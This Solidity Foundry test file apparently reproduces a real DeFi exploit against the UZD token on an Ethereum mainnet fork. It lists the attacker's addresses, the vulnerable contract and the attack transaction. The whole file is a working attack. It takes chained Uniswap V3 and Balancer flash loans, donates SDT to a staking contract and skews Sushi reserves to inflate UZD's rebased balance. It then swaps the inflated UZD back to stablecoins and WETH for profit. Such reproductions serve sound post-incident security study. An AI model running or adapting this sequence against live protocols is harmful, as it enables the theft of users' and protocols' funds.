// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2M USD$
// Attacker : https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df
// Attack Contract : https://etherscan.io/address/0xa21a2b59d80dc42d332f778cbb9ea127100e5d75
// Vulnerable Contract : https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c
// Attack Tx : https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c#code

// @Analysis
// Twitter Guy : https://twitter.com/peckshield/status/1690877589005778945
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1690931111776358400

interface IUZD is IERC20 {
    function cacheAssetPrice() external;
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth,
        address receiver
    ) external returns (uint256);
}

contract ContractTest is Test {
    IUZD UZD = IUZD(0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 crvFRAX = IERC20(0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 SDT = IERC20(0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F);
    IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    ICurvePool FRAX_USDC_POOL = ICurvePool(0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2);
    ICurvePool UZD_crvFRAX_POOL = ICurvePool(0x68934F60758243eafAf4D2cFeD27BF8010bede3a);
    ICurvePool crvUSD_USDC_POOL = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    ICurvePool crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);
    ICurvePool Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurve ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);
    Uni_Router_V2 sushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Uni_Pair_V3 USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    Uni_Pair_V3 USDC_USDT_Pair = Uni_Pair_V3(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address MIMCurveStakeDao = 0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_908_949);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(UZD), "UZD");
        vm.label(address(crvUSD), "crvUSD");
        vm.label(address(crvFRAX), "crvFRAX");
        vm.label(address(USDT), "USDT");
        vm.label(address(FRAX), "FRAX");
        vm.label(address(FRAX_USDC_POOL), "FRAX_USDC_POOL");
        vm.label(address(UZD_crvFRAX_POOL), "UZD_crvFRAX_POOL");
        vm.label(address(crvUSD_USDC_POOL), "crvUSD_USDC_POOL");
        vm.label(address(crvUSD_UZD_POOL), "crvUSD_UZD_POOL");
        vm.label(address(Curve3POOL), "Curve3POOL");
        vm.label(address(ETH_SDT_POOL), "ETH_SDT_POOL");
        vm.label(address(sushiRouter), "sushiRouter");
        vm.label(address(USDC_WETH_Pair), "USDC_WETH_Pair");
        vm.label(address(USDC_USDT_Pair), "USDC_USDT_Pair");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(MIMCurveStakeDao), "MIMCurveStakeDao");
    }

    function testExploit() external {
        USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        BalancerFlashLoan();

        uint256 amount = abi.decode(data, (uint256));
        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);
    }

    function BalancerFlashLoan() internal {
        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 7_000_000 * 1e6;
        amounts[1] = 10_011 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // balancer flashloan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        apporveAll();

        uint256[2] memory amount;
        amount[0] = 0;
        amount[1] = 5_750_000 * 1e6;
        uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0); // mint crvFRAX

        UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // swap crvFRAX to UZD

        crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); // swap USDC to crvUSD

        crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to UZD

        ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // swap WETH to SDT

        // @Vulnerability Code:
        // UZD balanceOf return value is manipulated by the following values
        // uint256 amountIn = sdtEarned + _config.sdt.balanceOf(address(this)); -> get SDT amount in MIMCurveStakeDao
        // uint256 sdtEarningsInFeeToken = priceTokenByExchange(amountIn, _config.sdtToFeeTokenPath); -> sushi router.getAmountsOut(amountIn, exchangePath); path: SDT -> WETH -> USDT
        emit log_named_decimal_uint(
            "Before donation and reserve manipulation, UZD balance", UZD.balanceOf(address(this)), WETH.decimals()
        );
        SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // donate SDT to MIMCurveStakeDao, inflate UZD balance

        swapToken1Totoken2(WETH, SDT, 10_000 ether); // swap WETH to SDT by sushi router
        uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6); // swap USDT to WETH by sushi router

        UZD.cacheAssetPrice(); // rebase UZD balance

        emit log_named_decimal_uint(
            "After donation and reserve manipulation, UZD balance", UZD.balanceOf(address(this)), WETH.decimals()
        );

        swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // swap SDT to WETH
        swapToken1Totoken2(WETH, USDT, value); // swap WETH to USDT

        UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // swap UZD to crvFRAX

        crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // swap UZD to crvUSD

        FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); // burn crvFRAX

        FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); // swap FRAX to USDC

        crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to USDC

        Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); // swap USDC to USDT

        uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];
        USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); // swap USDC to WETH

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
    }

    function apporveAll() internal {
        USDC.approve(address(FRAX_USDC_POOL), type(uint256).max);
        crvFRAX.approve(address(UZD_crvFRAX_POOL), type(uint256).max);
        UZD.approve(address(UZD_crvFRAX_POOL), type(uint256).max);
        USDC.approve(address(crvUSD_USDC_POOL), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDC_POOL), type(uint256).max);
        crvUSD.approve(address(crvUSD_UZD_POOL), type(uint256).max);
        UZD.approve(address(crvUSD_UZD_POOL), type(uint256).max);
        WETH.approve(address(ETH_SDT_POOL), type(uint256).max);
        USDC.approve(address(Curve3POOL), type(uint256).max);
        USDC.approve(address(USDC_WETH_Pair), type(uint256).max);
        WETH.approve(address(sushiRouter), type(uint256).max);
        SDT.approve(address(sushiRouter), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);
        FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);
    }

    function swapToken1Totoken2(IERC20 token1, IERC20 token2, uint256 amountIn) internal returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);
        uint256[] memory values =
            sushiRouter.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
        return values[1];
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        USDC.transfer(msg.sender, uint256(amount0Delta));
    }
}
